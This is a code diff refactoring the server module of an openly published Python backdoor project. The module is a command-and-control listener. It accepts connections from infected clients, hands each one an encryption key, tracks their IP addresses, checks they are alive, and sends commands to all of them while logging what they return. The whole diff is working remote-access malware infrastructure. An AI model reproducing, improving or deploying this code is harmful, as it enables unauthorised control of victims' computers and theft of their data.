@@ -6,28 +6,32 @@ https://github.com/xp4xbox/Python-Backdoor
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
 import base64
+import logging
 import socket
 import sys
 from threading import Thread
 
-from src import helper, errors
 from src.encrypted_socket import EncryptedSocket
+from src.encryption import Encryption
+from src import helper, errors
 from src.definitions.commands import *
 
+from src.logger import LOGGER_ID
 
-class Socket(EncryptedSocket):
+
+class Server:
     def __init__(self, port):
-        super().__init__()
+        self.logger = logging.getLogger(LOGGER_ID)
 
         self.thread_accept = None
         self.port = port
         self.connections = []
         self.addresses = []
 
-        self.new_key()
+        self.encryption = Encryption()
+        self.fernet = self.encryption.fernet
 
         self.listener = socket.socket()
-        self.socket = None  # socket for a connection
 
         try:
             self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
@@ -52,26 +56,28 @@ class Socket(EncryptedSocket):
         def socket_accept():
             while True:
                 try:
-                    self.socket, address = self.listener.accept()
-                    self.socket.setblocking(1)  # no timeout
+                    _socket, address = self.listener.accept()
+                    _socket.setblocking(True)
+
+                    es = EncryptedSocket(_socket, self.fernet)
 
                     # first command is always the unencrypted key (as b64)
                     # not the best solution, but sending it raw without wrapped JSON will remove emphasis
-                    self.send(base64.b64encode(self.key), False)
-                    self.logger.debug(f"send key: {self.key}")
+                    es.send(base64.b64encode(self.encryption.key), False)
+                    self.logger.debug(f"send key: {self.encryption.key}")
 
                     while True:
                         # wait for handshake
-                        response = self.recv_json()
+                        response = es.recv_json()
                         if response["key"] == CLIENT_HANDSHAKE:
                             break
 
                     address = {**{"ip": address[0], "port": address[1]}, **response["value"], **{"connected": True}}
 
-                    if self.socket in self.connections:
-                        self.addresses[self.connections.index(self.socket)]["connected"] = True
+                    if es.socket in self.connections:
+                        self.addresses[self.connections.index(es.socket)]["connected"] = True
                     else:
-                        self.connections.append(self.socket)
+                        self.connections.append(es.socket)
                         self.addresses.append(address)
 
                     self.logger.info(
@@ -86,10 +92,12 @@ class Socket(EncryptedSocket):
 
     def close_clients(self):
         if len(self.connections) > 0:
-            for _, self.socket in enumerate(self.active_connections()):
+            for _, _socket in enumerate(self.active_connections()):
+                es = EncryptedSocket(_socket, self.fernet)
+
                 try:
-                    self.send_json(CLIENT_EXIT)
-                    self.socket.close()
+                    es.send_json(CLIENT_EXIT)
+                    es.socket.close()
                 except socket.error:
                     pass
         else:
@@ -99,49 +107,51 @@ class Socket(EncryptedSocket):
         del self.addresses
         self.connections = []
         self.addresses = []
-        self.socket = None
 
     # either close with by index or a socket
     def close_one(self, index=-1, sck=None):
+        if index == -1:
+            if sck is None:
+                self.logger.error("Invalid use of function")
+                return
+
+            index = self.connections.index(sck) + 1
+
         try:
-            if index == -1:
-                if sck is None:
-                    self.logger.error("Invalid use of function")
-                    return
-
-                index = self.connections.index(sck) + 1
-
-            self.select(index)
-            self.send_json(CLIENT_EXIT)
-            self.socket.close()
-        except socket.error:
-            pass
+            es = self.select(index)
         except errors.ServerSocket.InvalidIndex as e:
             self.logger.error(e)
             return
 
-        self.addresses[self.connections.index(self.socket)]["connected"] = False
-        self.socket = None
+        try:
+            es.send_json(CLIENT_EXIT)
+            es.socket.close()
+        except socket.error:
+            pass
+
+        self.addresses[self.connections.index(es.socket)]["connected"] = False
 
     def refresh(self):
-        for _, self.socket in enumerate(self.active_connections()):
+        for _, _socket in enumerate(self.active_connections()):
             close_conn = False
 
+            es = EncryptedSocket(_socket, self.fernet)
+
             try:
-                self.send_json(CLIENT_HEARTBEAT)
+                es.send_json(CLIENT_HEARTBEAT)
             except socket.error:
                 close_conn = True
             else:
-                if self.recv_json()["key"] != SUCCESS:
+                if es.recv_json()["key"] != SUCCESS:
                     close_conn = True
 
             if close_conn:
                 # close conn, but don't send the close signal, so it can restart
-                self.socket.close()
-                self.addresses[self.connections.index(self.socket)]["connected"] = False
+                es.socket.close()
+                self.addresses[self.connections.index(es.socket)]["connected"] = False
 
-    def get_curr_address(self):
-        return self.addresses[self.connections.index(self.socket)]
+    def get_address(self, _socket):
+        return self.addresses[self.connections.index(_socket)]
 
     def list(self, inactive=False):
         addresses = []
@@ -182,7 +192,7 @@ class Socket(EncryptedSocket):
             if connection_id < 1:
                 raise Exception
 
-            self.socket = self.connections[connection_id - 1]
+            _socket = self.connections[connection_id - 1]
 
             if not self.addresses[connection_id - 1]["connected"]:
                 raise Exception
@@ -190,25 +200,29 @@ class Socket(EncryptedSocket):
         except Exception:
             raise errors.ServerSocket.InvalidIndex(f"No active connection found with index {connection_id}")
 
+        return EncryptedSocket(_socket, self.fernet)
+
     def send_all_connections(self, key, value, recv=False, recvall=False):
         if self.num_active_connections() > 0:
-            for i, self.socket in enumerate(self.active_connections()):
+            for i, _socket in enumerate(self.active_connections()):
+
+                es = EncryptedSocket(_socket, self.fernet)
 
                 try:
-                    self.send_json(key, value)
+                    es.send_json(key, value)
                 except socket.error:
                     continue
 
                 output = ""
 
                 if recvall:
-                    buffer = self.recv_json()["value"]["buffer"]
-                    output = self.recvall(buffer).decode()
+                    buffer = es.recv_json()["value"]["buffer"]
+                    output = es.recvall(buffer).decode()
                 elif recv:
-                    output = self.recv_json()["value"]
+                    output = es.recv_json()["value"]
 
                 if output:
-                    _info = self.addresses[self.connections.index(self.socket)]
+                    _info = self.addresses[self.connections.index(es.socket)]
                     self.logger.info(f"Response from connection {str(i+1)} at {_info['ip']}:{_info['port']} \n{output}")
         else:
             self.logger.warning("No active connections")
